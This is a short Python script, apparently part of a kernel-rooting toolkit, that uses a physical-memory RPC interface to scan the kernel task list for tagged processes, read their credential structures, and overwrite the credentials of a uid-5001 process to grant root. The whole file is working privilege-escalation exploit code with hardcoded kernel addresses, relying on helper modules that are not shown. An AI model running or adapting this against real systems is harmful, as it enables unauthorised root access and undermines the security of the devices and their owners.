"""DIAGNOSTIC scratch script - not part of the toolkit's supported paths.

Patches the stub's own cred by walking the task-list tail for PHYSRPC1.  Kept
because it is the smallest reproduction of `kernel_root.root_via_fork` when the
tail walk works; prefer `kernel_root.py --fork` (validated, with retries).

Like the supported paths it tries EVERY PHYSRPC1 task and only writes a uid-5001
cred: a stale tag can point at a uid-0 cred, and that used to be enough to stop
the old single-hit version (see docs/OPEN-ISSUES.md).
"""
import struct
import time

import physmap as T
import kernel_root as K

INIT_V, INIT_P = 0xC0957180, 0x20957180
rpc = T.RPC(timeout=15)
try:
    patched = 0
    for i in range(8):
        tasks = K._find_tags_near_tail(rpc, INIT_P, INIT_V, 0x23C, b"PHYSRPC1", 600)
        print("scan", i, [hex(t) for t in tasks], flush=True)
        for task in tasks:
            for off in (K.O_CRED, K.O_REAL):
                try:
                    c = rpc.read_u32(K.PHYS(task) + off)
                except Exception:
                    continue
                if not K._sane_cred(rpc, c):
                    continue
                ids = struct.unpack_from("<8I", rpc.read(K.PHYS(c), 36), 4)
                print("ids", ids, flush=True)
                if ids[0] == 5001 and K.patch_full(rpc, c):
                    patched += 1
                    print("patched", hex(c), flush=True)
        if patched:
            break
        time.sleep(0.5)
finally:
    rpc.close()
